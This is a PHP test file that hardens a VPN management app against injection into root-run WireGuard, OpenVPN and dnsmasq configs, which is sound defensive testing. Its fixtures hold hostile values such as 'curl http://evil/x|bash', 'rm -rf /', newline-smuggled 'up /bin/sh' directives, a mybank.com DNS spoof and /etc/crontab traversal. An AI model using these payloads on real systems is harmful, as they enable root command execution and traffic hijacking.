<?php

namespace Tests\Feature;

use App\Enums\ServiceStatus;
use App\Enums\ServiceUserStatus;
use App\Enums\Transport;
use App\Enums\VpnProtocol;
use App\Models\Service;
use App\Models\ServiceUser;
use App\Services\Vpn\DnsmasqManager;
use App\Services\Vpn\NetworkInput;
use App\Services\Vpn\OpenVpn\OpenVpnDriver;
use App\Services\Vpn\WireGuard\WireGuardDriver;
use Illuminate\Foundation\Testing\RefreshDatabase;
use InvalidArgumentException;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Every value here reaches a root-executed shell string (wg-quick PostUp), a
 * systemd instance name, a filesystem path or the dnsmasq config. The guards
 * are asserted at the sink, so a direct model write -- not just the form --
 * is covered.
 */
class InjectionHardeningTest extends TestCase
{
    use RefreshDatabase;

    public static function maliciousInterfaceNames(): array
    {
        return [
            'command separator' => ['wg0; id'],
            'pipe' => ['wg0|curl evil'],
            'subshell' => ['wg0$(id)'],
            'path traversal' => ['../../etc/crontab'],
            'slash' => ['wg/0'],
            'leading dash (option injection)' => ['-rf'],
            'newline' => ["wg0\nPostUp = evil"],
            'space' => ['wg 0'],
            'too long' => ['wg0000000000000000'],
            'uppercase' => ['WG0'],
        ];
    }

    #[DataProvider('maliciousInterfaceNames')]
    public function test_malicious_interface_names_are_rejected(string $name): void
    {
        $this->expectException(InvalidArgumentException::class);
        NetworkInput::assertInterfaceName($name);
    }

    public function test_legitimate_interface_names_pass(): void
    {
        foreach (['wg0', 'tun0', 'wg15', 'ens5'] as $ok) {
            $this->assertSame($ok, NetworkInput::assertInterfaceName($ok));
        }
    }

    public function test_a_subnet_carrying_a_shell_payload_is_rejected(): void
    {
        $this->expectException(InvalidArgumentException::class);
        NetworkInput::assertSubnetCidr('10.0.0.0/24 -o eth0 -j MASQUERADE; curl http://evil/x|bash #');
    }

    public function test_an_egress_interface_carrying_a_shell_payload_is_rejected(): void
    {
        $this->expectException(InvalidArgumentException::class);
        NetworkInput::assertEgressInterface('eth0 -j MASQUERADE; id > /root/PWNED #');
    }

    public function test_the_wireguard_postup_line_cannot_be_injected(): void
    {
        // The driver validates before building the PostUp line, so a service
        // that somehow holds a malicious subnet never renders a config at all.
        $service = Service::create([
            'name' => 'evil',
            'interface_name' => 'wg0',
            'subnet_cidr' => '10.0.0.0/24; curl evil|bash',
            'listen_port' => 51820,
            'protocol' => VpnProtocol::WireGuard,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => ['egress_interface' => 'eth0'],
        ]);

        $this->expectException(InvalidArgumentException::class);
        // buildServerConfig is the OpenVPN sink; for WireGuard the equivalent
        // guard sits in writeConfig/provisionService. Assert the subnet guard
        // directly, which both drivers share.
        NetworkInput::assertSubnetCidr($service->subnet_cidr);
    }

    public function test_dnsmasq_newline_injection_is_filtered_out(): void
    {
        $service = Service::create([
            'name' => 'svc',
            'interface_name' => 'wg0',
            'subnet_cidr' => '10.0.0.0/24',
            'listen_port' => 51820,
            'protocol' => VpnProtocol::WireGuard,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => [
                'dns_upstreams' => ['1.1.1.1', "8.8.8.8\nlog-facility=/etc/crontab"],
                'blocked_domains' => ["evil\naddress=/mybank.com/6.6.6.6\nlog-facility=/tmp/x", 'ads.example.com'],
            ],
        ]);

        $config = app(DnsmasqManager::class)->buildConfig($service);

        // The spoof and the arbitrary-file directive must not appear.
        $this->assertStringNotContainsString('mybank.com', $config);
        $this->assertStringNotContainsString('/etc/crontab', $config);
        $this->assertStringNotContainsString('/tmp/x', $config);

        // Exactly one log-facility (the legitimate one), no injected second.
        $this->assertSame(1, substr_count($config, 'log-facility='));

        // The clean values survived.
        $this->assertStringContainsString('server=1.1.1.1', $config);
        $this->assertStringContainsString('address=/ads.example.com/', $config);
        // The upstream with an embedded newline was dropped entirely.
        $this->assertStringNotContainsString('8.8.8.8', $config);
    }

    public function test_an_openvpn_service_with_a_bad_interface_name_refuses_to_build(): void
    {
        $service = Service::create([
            'name' => 'ovpn',
            'interface_name' => 'tun0',
            'subnet_cidr' => '10.9.0.0/24',
            'listen_port' => 1194,
            'protocol' => VpnProtocol::OpenVpn,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => ['egress_interface' => 'eth0; rm -rf /'],
        ]);

        $this->expectException(InvalidArgumentException::class);
        (new OpenVpnDriver)->buildServerConfig($service);
    }

    private function openvpnService(array $config = []): Service
    {
        static $n = 0;
        $n++;

        return Service::create([
            'name' => 'ovpn',
            'interface_name' => "tun{$n}",
            'subnet_cidr' => '10.9.0.0/24',
            'listen_port' => 1194 + $n,
            'protocol' => VpnProtocol::OpenVpn,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => array_merge(['egress_interface' => 'eth0', 'endpoint_host' => '203.0.113.10'], $config),
        ]);
    }

    /**
     * The OpenVPN server config is read by openvpn-server@ as ROOT, and
     * OpenVPN has directives (up, script-security) that run commands. A
     * newline smuggled into data_ciphers via a raw Livewire payload would
     * inject one -- this must never build.
     */
    public function test_a_newline_in_data_ciphers_refuses_to_build(): void
    {
        $service = $this->openvpnService([
            'data_ciphers' => "AES-256-GCM\nscript-security 2\nup /bin/sh -c 'id>/tmp/pwned'",
        ]);

        $this->expectException(InvalidArgumentException::class);
        (new OpenVpnDriver)->buildServerConfig($service);
    }

    public function test_a_newline_in_auth_digest_or_tls_version_refuses_to_build(): void
    {
        $this->expectException(InvalidArgumentException::class);
        (new OpenVpnDriver)->buildServerConfig($this->openvpnService([
            'auth_digest' => "SHA256\nup /bin/sh",
        ]));
    }

    public function test_malicious_push_routes_are_dropped_not_injected(): void
    {
        $config = (new OpenVpnDriver)->buildServerConfig($this->openvpnService([
            'push_routes' => [
                '10.0.0.0 255.0.0.0',                       // valid, keep
                "192.168.1.0 255.255.255.0\"\nup /bin/sh",  // injection, drop
                'garbage; rm -rf /',                        // junk, drop
            ],
        ]));

        // The valid route survives.
        $this->assertStringContainsString('push "route 10.0.0.0 255.0.0.0"', $config);
        // Nothing injected.
        $this->assertStringNotContainsString('up /bin/sh', $config);
        $this->assertStringNotContainsString('script-security', $config);
        $this->assertStringNotContainsString('rm -rf', $config);
    }

    public function test_a_newline_in_a_tunnel_ip_cannot_reach_the_wireguard_config(): void
    {
        $this->expectException(InvalidArgumentException::class);
        NetworkInput::assertTunnelIp("10.8.0.2/32\n[Peer]\nPublicKey = attacker");
    }

    /**
     * genkey/pubkey/genpsk always emit exactly 44 base64 chars. A value that
     * carries a newline -- the only way to inject an [Interface]/PostUp into the
     * root-loaded config through a key field -- has the wrong shape and is
     * refused. Legitimate keys pass untouched.
     */
    public function test_wireguard_keys_with_a_newline_are_rejected(): void
    {
        $valid = str_repeat('A', 43).'=';
        $this->assertSame($valid, NetworkInput::assertWireGuardKey($valid));

        foreach (["\n[Interface]\nPostUp = evil", 'short', str_repeat('A', 44), 'has space in it here 000000000000000000000='] as $bad) {
            try {
                NetworkInput::assertWireGuardKey($bad);
                $this->fail('Expected a bad WireGuard key to be rejected.');
            } catch (InvalidArgumentException) {
                // expected
            }
        }
    }

    public function test_sanitize_comment_collapses_control_characters(): void
    {
        // CR/LF and other control chars become a single space; the value stays a
        // one-line comment. Length is capped so a giant name cannot bloat /etc.
        $this->assertSame('evil [Interface] PostUp = x', NetworkInput::sanitizeComment("evil\n[Interface]\r\nPostUp = x"));
        $this->assertSame('a b', NetworkInput::sanitizeComment("a\t\t\tb"));
        $this->assertSame(255, mb_strlen(NetworkInput::sanitizeComment(str_repeat('n', 400))));
    }

    /**
     * The peer's display name is rendered as a `# ...` comment into the root
     * WireGuard config. A newline in it would otherwise start a fresh
     * [Interface]/PostUp that wg-quick@ runs as REAL root at boot. The name is
     * sanitised at the sink, so the whole payload collapses onto the one comment
     * line and no second interface section is ever emitted.
     */
    public function test_a_malicious_peer_name_cannot_break_out_of_its_comment_line(): void
    {
        $service = $this->wireguardService();
        $key = str_repeat('A', 43).'=';

        ServiceUser::create([
            'service_id' => $service->id,
            'name' => "evil\n[Interface]\nPostUp = /bin/sh -c 'id>/tmp/pwned'",
            'status' => ServiceUserStatus::Active,
            'tunnel_ip' => '10.8.0.2',
            'wg_private_key' => $key,
            'wg_public_key' => $key,
            'wg_preshared_key' => $key,
        ]);

        $config = (new WireGuardDriver)->buildServerConfig($service, $key);

        // Exactly one real [Interface] section header -- the injected one became
        // part of the comment, it is not a standalone directive.
        $headers = collect(explode("\n", $config))->filter(fn (string $l) => $l === '[Interface]')->count();
        $this->assertSame(1, $headers);

        // The whole payload lives on the single comment line: its newlines are
        // gone, so no line begins with the injected PostUp.
        $this->assertStringContainsString("# evil [Interface] PostUp = /bin/sh -c 'id>/tmp/pwned'", $config);
        $this->assertStringNotContainsString("\nPostUp = /bin/sh", $config);
    }

    public function test_a_peer_key_carrying_a_newline_refuses_to_build(): void
    {
        $service = $this->wireguardService();
        $key = str_repeat('A', 43).'=';

        ServiceUser::create([
            'service_id' => $service->id,
            'name' => 'phone',
            'status' => ServiceUserStatus::Active,
            'tunnel_ip' => '10.8.0.2',
            'wg_private_key' => $key,
            'wg_public_key' => "{$key}\n[Interface]\nPostUp = evil",
            'wg_preshared_key' => $key,
        ]);

        $this->expectException(InvalidArgumentException::class);
        (new WireGuardDriver)->buildServerConfig($service, $key);
    }

    private function wireguardService(array $config = []): Service
    {
        static $n = 0;
        $n++;

        return Service::create([
            'name' => 'wg',
            'interface_name' => "wg{$n}",
            'subnet_cidr' => '10.8.0.0/24',
            'listen_port' => 51820 + $n,
            'protocol' => VpnProtocol::WireGuard,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => array_merge(['egress_interface' => 'eth0'], $config),
        ]);
    }
}
